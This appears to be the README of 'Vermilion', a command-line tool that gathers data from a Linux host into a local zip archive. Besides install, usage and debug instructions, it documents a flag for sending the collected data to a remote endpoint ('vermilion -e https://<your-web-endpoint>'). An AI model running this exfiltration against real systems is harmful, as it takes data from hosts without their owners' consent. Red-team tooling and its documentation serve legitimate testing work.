# Vermilion Docs


## Installation  

New version of the tool are released via Github.  
You can retrieve the release you want from this page.  
Example via bash (wget):  
```sh
wget https://github.com/R3DRUN3/vermilion/releases/download/v0.1.0/vermilion_0.1.0_linux_amd64.tar.gz
tar -xzf vermilion_0.1.0_linux_amd64.tar.gz
chmod +x vermilion
```  

## Usage
In order to see the tool helper run:  
```sh
./vermilion -h
```  

By default no exfiltration is executed, the following two commands are the same:
```sh
./vermilion
```
and
```sh
vermilion --noexf
```  

both the previous command produce a local `exdata` folder with a compressed (.zip) archive inside.  
The archive contains all exfiltrated data.  


If you want to specify and endpoint for exfiltration run:  
```sh
vermilion -e https://<your-web-endpoint>
```  





## Debug  

You can use [*vscode*](https://code.visualstudio.com/) for debugging.  
this repo already contains the `.vscode/launch.json` file:  

```json
{
    "version": "0.2.0",
    "configurations": [
        {
            "name": "Debug vermilion with VsCode",
            "type": "go",
            "request": "launch",
            "mode": "debug",
            "program": "${workspaceFolder}/main.go",
            "args": ["--noexf"],
            "env": {},
            "showLog": true,
            "cwd": "${workspaceFolder}"
        }
    ]
}
```  

Just modify this file to accomodate your configuration and launch the debug via vscode.  

## Test Exfiltration  

You can test data exfiltration locally by following [*these instructions*](../tests/exfiltration/README.md).  
  


